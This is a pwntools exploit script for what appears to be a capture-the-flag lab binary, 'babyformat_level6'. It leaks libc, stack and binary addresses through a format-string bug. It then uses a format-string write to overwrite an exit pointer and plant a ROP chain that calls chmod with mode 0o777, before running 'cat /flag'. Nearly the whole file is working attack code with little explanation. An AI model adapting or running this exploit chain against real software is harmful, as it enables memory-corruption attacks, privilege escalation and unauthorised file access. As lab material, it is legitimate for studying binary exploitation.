#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level6
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level6')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

exploit = f"%3$lx %170$p %171$p"
payload = exploit.encode()  
io.recvuntil(b'read your input again.')
io.sendline(payload)

io.recvuntil(b"Your input is:")
io.recvline()
leak_bytes = io.recvline(keepends=False)
# print(f"leak_bytes : {leak_bytes}")
leak = leak_bytes.decode().split(' ')
print(f"leak_bytes : {leak[0], leak[1]}")

print(f"leaked_libc_func : {leak[0]}")
leaked_libc_func_int = int(leak[0], 16)
libc_base = leaked_libc_func_int - 0x10e077
print(f"libc_base : 0x{libc_base:x}")

leaked_rbp = leak[1]
print(f"leaked rbp : {leaked_rbp}")
rbp_main = int(leaked_rbp, 16)
rbp_func = rbp_main - 80 # 80 = diff of rbp main and func
print(f"leaked rbp func : {hex(rbp_func)}")
leaked_ret = rbp_func + 8
rip_func_addr = leaked_ret
print(f"leaked rip func : {hex(leaked_ret)}")
rsp_func=rbp_func-1312 # 1320 = diff between rbp and rsp of func
print(f"leaked rsp_func : 0x{rsp_func:x}")

leaked_current_instruction = int(leak[2], 16)
print(f"leaked_current_instruction : 0x{leaked_current_instruction:x}")
leaked_binary_base =leaked_current_instruction - 5611
print(f"leaked_binary_base : 0x{leaked_binary_base:x}")
# func_addr = rip_func_addr - 0x15eb + 0x12b0 
pop_rdi = 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
pop_rsi = 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
pop_rdx = 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
pop_rax = 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
syscall = 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"
# group = 0x1eb1f3 #  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
base = libc_base
# exit_loc = base + 0x060
# exit_loc = rip_func_addr - 0x15eb  + 0x4060 
# print(f"exit address : 0x{exit_loc:x}")
# func_addr = rip_func_addr - 0x15eb  + 0x12b0 
# print(f"func_addr address : 0x{func_addr:x}")

# exit_loc = base + 0x46a40 # exit offset from libc objdump
# exit_loc = rip_func_addr - 46494429499512

print(f"base + 0x578c8 : 0x{base + 0x578c8:x}")
print(f"base + pop_rdi : 0x{base + pop_rdi:x}")
print(f"base + 0x1eb1f3 : 0x{base + 0x1eb1f3:x}")
print(f"base + pop_rsi : 0x{base + pop_rsi:x}")
print(f"base + pop_rdx : 0x{base + pop_rdx:x}")
print(f"base + pop_rax : 0x{base + pop_rax:x}")
print(f"base + 0x2284d : 0x{base + 0x2284d:x}")

# exit_loc = rip_func_addr - 0x15eb  + 0x4060 

exit_loc = leaked_binary_base + 0x4060
print(f"exit address : 0x{exit_loc:x}")
base = libc_base
# new_rsp = rsp_func
new_rsp =  rip_func_addr

p2 = b"A"*2 + fmtstr_payload(43, {
    exit_loc : p64(base + 0x578c8).ljust(8, b"\x00"),
    new_rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
    new_rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
    new_rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
    new_rsp + 24 : p64(0o777),
    new_rsp + 32 : p64(base + pop_rdx).ljust(8, b"\x00"),
    new_rsp + 40 : p64(0),
    new_rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
    new_rsp + 56 : p64(0x5a),
    new_rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
    }, numbwritten=40,  write_size='short', strategy='fast')

print("first")
print(io.recvline())
print(io.recvline())
print(io.recvline())
io.sendline(p2)
print("second")
print(io.recvline())
print(io.recvline())
print(io.recv())
system("cat /flag")
io.interactive()

